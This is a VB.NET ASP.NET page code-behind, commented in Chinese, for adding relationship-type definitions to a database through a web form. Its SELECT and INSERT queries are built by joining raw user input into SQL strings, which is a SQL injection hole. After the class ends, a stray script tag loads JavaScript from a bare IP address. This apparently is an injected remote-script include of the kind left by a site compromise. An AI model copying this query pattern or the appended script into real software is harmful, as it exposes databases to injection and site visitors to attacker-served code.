Imports System.Data
Imports System.Data.SqlClient

Public Class WebForm3
    Inherits System.Web.UI.Page

#Region " Web 窗体设计器生成的代码 "

    '该调用是 Web 窗体设计器所必需的。
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents lblWarning As System.Web.UI.WebControls.Label
    Protected WithEvents btnCancel As System.Web.UI.WebControls.Button
    Protected WithEvents btnNext As System.Web.UI.WebControls.Button
    Protected WithEvents rbtnIsValidNo As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnIsValidYes As System.Web.UI.WebControls.RadioButton
    Protected WithEvents Label4 As System.Web.UI.WebControls.Label
    Protected WithEvents rbtnAccPri3 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnAccPri2 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnAccPri1 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents lblIsValid As System.Web.UI.WebControls.Label
    Protected WithEvents rbtnNeedAffNo As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnNeedAffYes As System.Web.UI.WebControls.RadioButton
    Protected WithEvents lblNeedAff As System.Web.UI.WebControls.Label
    Protected WithEvents rbtnIsDirNo As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnIsDirYes As System.Web.UI.WebControls.RadioButton
    Protected WithEvents Label1 As System.Web.UI.WebControls.Label
    Protected WithEvents txtRelObjNum As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblRelObjNum As System.Web.UI.WebControls.Label
    Protected WithEvents txtDefName As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblDefName As System.Web.UI.WebControls.Label
    Protected WithEvents txtDefKey As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblDefKey As System.Web.UI.WebControls.Label
    Protected WithEvents ddlstModelKey As System.Web.UI.WebControls.DropDownList
    Protected WithEvents lblModelKey As System.Web.UI.WebControls.Label
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents Form1 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents txtDefKeyRegularExpressionValidator As System.Web.UI.WebControls.RegularExpressionValidator
    Protected WithEvents txtRelObjNumRegularexpressionvalidator1 As System.Web.UI.WebControls.RegularExpressionValidator


    '注意: 以下占位符声明是 Web 窗体设计器所必需的。
    '不要删除或移动它。
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: 此方法调用是 Web 窗体设计器所必需的
        '不要使用代码编辑器修改它。
        InitializeComponent()
    End Sub

#End Region
    
    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Me.lblWarning.Visible = False

        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite
        If Session("UserName") = "" Then
            Me.lblHint.Text = "您还没登录，请先登录"
        Else
            Me.lblHint.Text = "您好， " + Session("UserName")
        End If

        If Not IsPostBack Then  ' 用户x第一次打开页面时
            Me.rbtnIsValidYes.Checked = True
            Me.rbtnNeedAffYes.Checked = True
            Me.rbtnAccPri1.Checked = True
            Me.rbtnIsDirYes.Checked = True
            Dim strSql As String
            Dim mySqlConn As New SqlConnection(Me.Application("DataBase"))
            Try
                mySqlConn.Open()

                Dim mySqlAdapter As New SqlDataAdapter("select rmodelkey from rmodel", mySqlConn)
                Dim myDateSet As New DataSet
                mySqlAdapter.Fill(myDateSet, "rmodel")
                Me.ddlstModelKey.DataSource = myDateSet.Tables("rmodel").DefaultView
                Me.ddlstModelKey.DataValueField = "rmodelkey"
                Me.ddlstModelKey.DataBind()
                mySqlConn.Close()
            Catch ex As SqlException
                Response.Redirect("error.htm") ' 错误提示
            Finally
            End Try
        End If
    End Sub

    Private Sub btnNext_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnNext.Click
        If (Me.txtDefKey.Text.Trim() = "" Or Me.txtDefName.Text.Trim() = "" Or Me.txtRelObjNum.Text.Trim() = "") Then
            Me.lblWarning.Text = "提醒：请先填好全部信息"
            Me.lblWarning.Visible = True
            Exit Sub
        End If

        Me.lblWarning.Visible = False

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        Dim sqlReader As SqlDataReader = Nothing
        strSql = "select * from rdefinition where rDefinitionKey='" + Me.txtDefKey.Text.Trim() + "'"
        ' 查看rRefinitionKey是否已否在
        Dim mySqlComm As SqlCommand
        mySqlComm = New SqlCommand(strSql, mySqlConn)
        Try
            mySqlConn.Open()
            sqlReader = mySqlComm.ExecuteReader()

            If (sqlReader.Read()) Then
                Me.lblWarning.Text = "警告：该关系类型编号已存在，请输入新的关系类型编号"
                lblWarning.Visible = True
            Else
                ' 获取用户权限值，有效性值,是否需要关联对象的确认信息,是否有向
                ' 保存在chrAccPri, chrIsValid，chrNeedAff和chrIsDir中
                Dim chrAccPri As Char
                Dim chrIsValid As Char
                Dim chrNeedAff As Char
                Dim chrIsDir As Char
                If Me.rbtnAccPri1.Checked = True Then
                    chrAccPri = "1"
                ElseIf Me.rbtnAccPri2.Checked = True Then
                    chrAccPri = "2"
                Else
                    chrAccPri = "3"
                End If
                If Me.rbtnIsValidYes.Checked = True Then
                    chrIsValid = "1"
                Else
                    chrIsValid = "0"
                End If
                If Me.rbtnNeedAffYes.Checked = True Then
                    chrNeedAff = "1"
                Else
                    chrNeedAff = "0"
                End If
                If Me.rbtnIsDirYes.Checked = True Then
                    chrIsDir = "1"
                Else
                    chrIsDir = "0"
                End If

                ' 插入数据项
                strSql = "Insert into rdefinition values('" + Me.txtDefKey.Text.Trim() + "'," + _
                    Me.ddlstModelKey.SelectedValue.Trim() + ",'" + Me.txtDefName.Text.Trim() + "','" + _
                    Me.txtRelObjNum.Text.Trim() + "','" + _
                    chrIsDir + "','" + chrAccPri + "','" + chrNeedAff + "','" + _
                    Now.ToString("yyyy-MM-dd HH:mm:ss") + "','" + Now.ToString("yyyy-MM-dd HH:mm:ss") + "','" + _
                    chrIsValid + "')"
                mySqlConn.Close()
                mySqlComm.CommandText = strSql
                mySqlConn.Open()
                If (mySqlComm.ExecuteNonQuery() > 0) Then
                    Me.lblWarning.Text = "恭喜：添加关系类型成功" + Me.txtDefKey.Text.Trim() + "成功"
                    Me.lblWarning.Visible = True
                    Me.Session("DefKey") = Me.txtDefKey.Text.Trim()
                    Me.Session("DefNum") = Int32.Parse(Me.txtRelObjNum.Text.Trim())
                    Me.Response.Redirect("addpublishrassertion.aspx")
                Else
                    Me.lblWarning.Text = "警告：由于某种原因添加关系类型失败，可能你没有权限"
                    Me.lblWarning.Visible = True
                End If
            End If
            sqlReader.Close()
            mySqlConn.Close()
        Catch ex As SqlException
            If sqlReader.IsClosed = False Then
                sqlReader.Close()
                mySqlConn.Close()
            End If
            Throw ex
            'Response.Redirect("error.htm") ' 错误提示
        Finally
        End Try
    End Sub

    Private Sub btnCancel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Me.lblWarning.Visible = False
        Me.txtDefKey.Text = ""
        Me.txtDefName.Text = ""
        Me.txtRelObjNum.Text = ""
        Me.rbtnAccPri2.Checked = False
        Me.rbtnAccPri3.Checked = False
        Me.rbtnAccPri1.Checked = True
        Me.rbtnIsValidNo.Checked = False
        Me.rbtnIsValidYes.Checked = True
        Me.rbtnNeedAffNo.Checked = False
        Me.rbtnNeedAffYes.Checked = True
        Me.rbtnIsDirNo.Checked = False
        Me.rbtnIsDirYes.Checked = True
    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
